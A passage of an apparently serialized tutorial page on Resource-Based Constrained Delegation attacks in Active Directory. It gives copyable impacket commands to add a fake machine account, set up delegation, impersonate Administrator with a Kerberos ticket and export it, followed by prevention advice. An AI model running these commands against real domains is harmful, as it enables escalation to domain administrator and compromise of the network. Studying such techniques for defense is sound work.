style=\"--0:#E1E4E8;--1:#E1E4E8\">domain:\u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">domain.com\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">/\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">ptt\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Cblockquote>\n\u003Cp>\u003Cstrong>Output\u003C/strong>: Provides the tickets needed\u003C/p>\n\u003C/blockquote>\u003Cp>From now, you successfully attacked \u003Cstrong>RBCD\u003C/strong>, you can check the admin’s ticket using klist\u003C/p>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"c\" class=\"wrap\" style=\"--ecMaxLine:5ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">klist\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003C/section>\u003C/section>\u003Csection>\u003Ch2 id=\"4-exploitation-from-linux\">4. Exploitation from Linux\u003Ca class=\"anchor\" href=\"#4-exploitation-from-linux\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h2>\u003Cfigure>\u003Cimg src=\"https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FwM71JlKyVXdIIbCKf5DS%2Fimage.png?alt=media&#x26;token=377b0e3f-6f70-48fd-82ae-f934ac2aa895\" alt=\"\">\u003Cfigcaption>\u003C/figcaption>\u003C/figure>\u003Csection>\u003Ch4 id=\"41-download-toolset\">4.1 Download toolset\u003Ca class=\"anchor\" href=\"#41-download-toolset\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h4>\u003Cp>In order to continue with the exploitation, we need to install \u003Ccode>impacket\u003C/code> if we don’t have it installed on our attacker system\u003C/p>\u003Cblockquote>\n\u003Cp>\u003Cstrong>Impacket\u003C/strong> is a \u003Cstrong>collection of Python classes and scripts for working with network protocols\u003C/strong> that provides programmatic low-level access to protocols like SMB, MSRPC, Kerberos, and LDAP for penetration testing and red team operations.\u003C/p>\n\u003C/blockquote>\u003Ca id=\"GCrmfrnp-card\" class=\"card-github fetch-waiting no-styling\" href=\"https://github.com/fortra/impacket\" target=\"_blank\" repo=\"fortra/impacket\">\u003Cdiv class=\"gc-titlebar\">\u003Cdiv class=\"gc-titlebar-left\">\u003Cdiv class=\"gc-owner\">\u003Cdiv id=\"GCrmfrnp-avatar\" class=\"gc-avatar\">\u003C/div>\u003Cdiv class=\"gc-user\">fortra\u003C/div>\u003C/div>\u003Cdiv class=\"gc-divider\">/\u003C/div>\u003Cdiv class=\"gc-repo\">impacket\u003C/div>\u003C/div>\u003Cdiv class=\"github-logo\">\u003C/div>\u003C/div>\u003Cdiv id=\"GCrmfrnp-description\" class=\"gc-description\">Waiting for api.github.com...\u003C/div>\u003Cdiv class=\"gc-infobar\">\u003Cdiv id=\"GCrmfrnp-stars\" class=\"gc-stars\">00K\u003C/div>\u003Cdiv id=\"GCrmfrnp-forks\" class=\"gc-forks\">0K\u003C/div>\u003Cdiv id=\"GCrmfrnp-license\" class=\"gc-license\">0K\u003C/div>\u003Cspan id=\"GCrmfrnp-language\" class=\"gc-language\">Waiting...\u003C/span>\u003C/div>\u003Cscript id=\"GCrmfrnp-script\" type=\"text/javascript\" defer>\n      fetch('https://api.github.com/repos/fortra/impacket', { referrerPolicy: \"no-referrer\" }).then(response => response.json()).then(data => {\n        document.getElementById('GCrmfrnp-description').innerText = data.description?.replace(/:[a-zA-Z0-9_]+:/g, '') || \"Description not set\";\n        document.getElementById('GCrmfrnp-language').innerText = data.language;\n        document.getElementById('GCrmfrnp-forks').innerText = Intl.NumberFormat('en-us', { notation: \"compact\", maximumFractionDigits: 1 }).format(data.forks).replaceAll(\" \", '');\n        document.getElementById('GCrmfrnp-stars').innerText = Intl.NumberFormat('en-us', { notation: \"compact\", maximumFractionDigits: 1 }).format(data.stargazers_count).replaceAll(\" \", '');\n        const avatarEl = document.getElementById('GCrmfrnp-avatar');\n        avatarEl.style.backgroundImage = 'url(' + data.owner.avatar_url + ')';\n        avatarEl.style.backgroundColor = 'transparent';\n        document.getElementById('GCrmfrnp-license').innerText = data.license?.spdx_id || \"no-license\";\n        document.getElementById('GCrmfrnp-card').classList.remove(\"fetch-waiting\");\n        console.log(\"[GITHUB-CARD] Loaded card for fortra/impacket | GCrmfrnp.\")\n      }).catch(err => {\n        const c = document.getElementById('GCrmfrnp-card');\n        c?.classList.add(\"fetch-error\");\n        console.warn(\"[GITHUB-CARD] (Error) Loading card for fortra/impacket | GCrmfrnp.\")\n      })\n    \u003C/script>\u003C/a>\u003C/section>\u003Csection>\u003Ch4 id=\"42-create-the-machine-account\">4.2 Create the Machine Account\u003Ca class=\"anchor\" href=\"#42-create-the-machine-account\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h4>\u003Cp>First let’s create an \u003Cem>Attacker-Controlled Machine Account\u003C/em> called \u003Ccode>FAKE01$\u003C/code> with the following password: \u003Ccode>Password123!\u003C/code>\u003C/p>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"bash\" class=\"wrap\" style=\"--ecMaxLine:116ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">impacket-addcomputer\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-computer-name\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">'FAKE01$'\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-computer-pass\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">'Password123!'\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-dc-ip\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">&#x3C;IP>\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">'&#x3C;domain>/&#x3C;User>:&#x3C;Password>'\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Cblockquote>\n\u003Cp>\u003Cstrong>Output:\u003C/strong> [+] Successfully added machine account FAKE01$ with password Password123!*\u003C/p>\n\u003C/blockquote>\u003C/section>\u003Csection>\u003Ch4 id=\"43-configuring-rbcd\">4.3 Configuring RBCD\u003Ca class=\"anchor\" href=\"#43-configuring-rbcd\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h4>\u003Cp>Now let’s grant \u003Cem>RBCD\u003C/em> permissions to allow \u003Ccode>FAKE01$\u003C/code> to delegate to \u003Ccode>target$\u003C/code> successfully while target$ being the victim computer object we want to delegate to\u003C/p>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"bash\" class=\"wrap\" style=\"--ecMaxLine:116ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">impacket-rbcd\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-delegate-to\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">'$target'\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-delegate-from\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">'FAKE01$'\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-dc-ip\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">&#x3C;ip>\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-action\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">write\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">'&#x3C;domain>/&#x3C;user>:&#x3C;password>'\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Cblockquote>\n\u003Cp>\u003Cstrong>Output:\u003C/strong> \u003Cem>[+] Delegation rights modified successfully!\u003C/em>\u003C/p>\n\u003C/blockquote>\u003C/section>\u003Csection>\u003Ch4 id=\"44-request-the-impersonation-ticket--export-it\">4.4 Request the Impersonation Ticket &#x26; Export it\u003Ca class=\"anchor\" href=\"#44-request-the-impersonation-ticket--export-it\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h4>\u003Cp>To finish this let’s request an \u003Cem>Impersonation Ticket\u003C/em>\u003C/p>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"bash\" class=\"wrap\" style=\"--ecMaxLine:103ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">impacket-getST\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-spn\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">cifs/\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">$target \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-impersonate\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Administrator\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-dc-ip\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">&#x3C;ip>\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">'&#x3C;domain>/FAKE01$:Password123!'\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Cp>We’re almost there, just export the \u003Cem>Kerberos Ticket\u003C/em>\u003C/p>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"bash\" class=\"wrap\" style=\"--ecMaxLine:38ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583;--1:#F97583\">export\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> KRB5CCNAME\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">Administrator.ccache\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Cp>From now, you successfully attacked \u003Cstrong>RBCD\u003C/strong>, you can check the admin’s ticket using klist\u003C/p>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"c\" class=\"wrap\" style=\"--ecMaxLine:5ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">klist\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003C/section>\u003C/section>\u003Csection>\u003Ch2 id=\"5-conclusion\">5. Conclusion\u003Ca class=\"anchor\" href=\"#5-conclusion\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h2>\u003Cp>RBCD attacks reveal a critical truth in Active Directory security: \u003Cstrong>excessive permissions on computer objects can lead to complete domain compromise\u003C/strong>. This isn’t a complex exploit—it’s abusing legitimate Kerberos features that become dangerous when combined with misconfigured trust.\u003C/p>\u003Cp>The attack works because:\u003C/p>\u003Cul>\n\u003Cli>\u003Cstrong>Default settings\u003C/strong> allow any user to create computer accounts\u003C/li>\n\u003Cli>\u003Cstrong>Write permissions\u003C/strong> on computer objects enable delegation configuration\u003C/li>\n\u003Cli>\u003Cstrong>Kerberos delegation\u003C/strong> lets services impersonate users across systems\u003C/li>\n\u003C/ul>\u003Cp>What makes RBCD particularly dangerous is its simplicity. With just a few commands, an attacker can escalate from basic domain user to domain administrator by weaponizing the very trust relationships designed to make AD functional.\u003C/p>\u003Csection>\u003Ch3 id=\"52-how-to-prevent-it\">5.2 \u003Cstrong>How to Prevent It:\u003C/strong>\u003Ca class=\"anchor\" href=\"#52-how-to-prevent-it\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h3>\u003Col>\n\u003Cli>\u003Cstrong>Clean up permissions\u003C/strong> regularly\u003C/li>\n\u003Cli>\u003Cstrong>Monitor for new computer accounts\u003C/strong>\u003C/li>\n\u003Cli>\u003Cstrong>Use “cannot be delegated” for important admin accounts\u003C/strong>\u003C/li>\n\u003Cli>\u003Cstrong>Remember: in Active Directory, who you trust is more important than what you know\u003C/strong>\u003C/li>\n\u003C/ol>\u003C/section>\u003C/section>\u003C/section>",{"headings":338,"localImagePaths":403,"remoteImagePaths":404,"frontmatter":405,"imagePaths":411},[339,342,345,348,351,355,358,361,364,367,370,373,376,379,382,385,388,391,394,397,400],{"depth":22,"slug":340,"text":341},"resource-based-constrained-delegation","Resource-Based Constrained Delegation#",{"depth":58,"slug":343,"text":344},"1-how-does-it-work","1. How Does it work?#",{"depth":123,"slug":346,"text":347},"11-understanding-ad-delegation","1.1 Understanding AD Delegation#",{"depth":123,"slug":349,"text":350},"12-constrained-vs-resource-based-delegation","1.2 Constrained vs Resource-Based Delegation#",{"depth":352,"slug":353,"text":354},4,"constrained-delegation","Constrained Delegation:#",{"depth":123,"slug":356,"text":357},"13-example-checking-constrained-delegation","1.3 Example: Checking constrained delegation#",{"depth":352,"slug":359,"text":360},"resource-based-constrained-delegation-rbcd","Resource-Based Constrained Delegation (RBCD):#",{"depth":58,"slug":362,"text":363},"2-scenario","2. Scenario#",{"depth":123,"slug":365,"text":366},"21-enumerating","2.1 Enumerating#",{"depth":58,"slug":368,"text":369},"3-exploitation-from-windows","3. Exploitation from Windows#",{"depth":352,"slug":371,"text":372},"31-downloading-toolset","3.1 Downloading toolset#",{"depth":352,"slug":374,"text":375},"32-creating-the-machine-account","3.2 Creating the Machine Account#",{"depth":352,"slug":377,"text":378},"33-configuring-rbcd","3.3 Configuring RBCD#",{"depth":352,"slug":380,"text":381},"performing-s4u-attack","Performing S4U Attack#",{"depth":58,"slug":383,"text":384},"4-exploitation-from-linux","4. Exploitation from Linux#",{"depth":352,"slug":386,"text":387},"41-download-toolset","4.1 Download toolset#",{"depth":352,"slug":389,"text":390},"42-create-the-machine-account","4.2 Create the Machine Account#",{"depth":352,"slug":392,"text":393},"43-configuring-rbcd","4.3 Configuring RBCD#",{"depth":352,"slug":395,"text":396},"44-request-the-impersonation-ticket--export-it","4.4 Request the Impersonation Ticket & Export it#",{"depth":58,"slug":398,"text":399},"5-conclusion","5. 